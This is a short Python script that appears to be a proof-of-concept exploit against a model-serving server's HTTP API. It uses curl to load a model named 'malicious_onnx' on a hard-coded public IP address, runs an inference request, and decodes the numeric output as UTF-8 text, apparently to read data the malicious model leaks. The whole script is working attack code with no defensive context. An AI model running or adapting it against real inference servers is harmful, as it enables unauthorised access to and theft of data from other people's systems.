import struct
import subprocess
import json

# config ip and shape of output
ipaddress="52.64.4.210:8000"
shape=[4,10]

# Load model using curl
subprocess.run(["curl", "-X", "POST", ipaddress+"/v2/repository/models/malicious_onnx/load"])

# Create the inference JSON payload
payload = {
    "inputs": [{
        "name": "X",
        "shape": shape,
        "datatype": "FP32",
        "data": [[0.0]*shape[1] for _ in range(shape[0])]
    }],
    "outputs": [{"name": "Y"}]
}
json_payload = json.dumps(payload)

# Send inference request via curl
result = subprocess.run(
    ["curl", "-X", "POST", ipaddress+"/v2/models/malicious_onnx/infer",
     "-H", "Content-Type: application/json", "-d", json_payload],
    capture_output=True,
)

ort_data=json.loads(result.stdout)
output=ort_data['outputs'][0]
data=output['data']

# Convert raw data to bytes
byte_data = b''.join(struct.pack('<f', val) for val in data)

print("raw data:\n",data,"\n")
print("bytes:\n", byte_data,"\n")
print("utf-8 string:\n", byte_data.decode('utf-8'))

